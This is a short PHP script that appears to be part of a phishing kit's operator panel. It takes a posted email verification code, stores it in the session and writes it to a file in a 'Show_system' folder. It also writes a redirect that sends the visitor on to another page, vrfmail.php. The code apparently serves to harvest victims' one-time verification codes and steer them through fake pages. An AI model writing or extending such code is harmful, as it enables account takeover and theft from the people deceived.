<?php


session_start();

if(isset($_POST['Emailverify'])) 
{
    
$Page .= ' <meta http-equiv="refresh" content="0;url=./vrfmail.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['textEmailverify'] = $_POST['textEmailverify'];

$yagmai .= ''.$textimage.'';

$f = fopen("../Show_system/Show_Emailverify.txt", "w");
    fwrite($f, $yagmai);




}

else {




}

?>

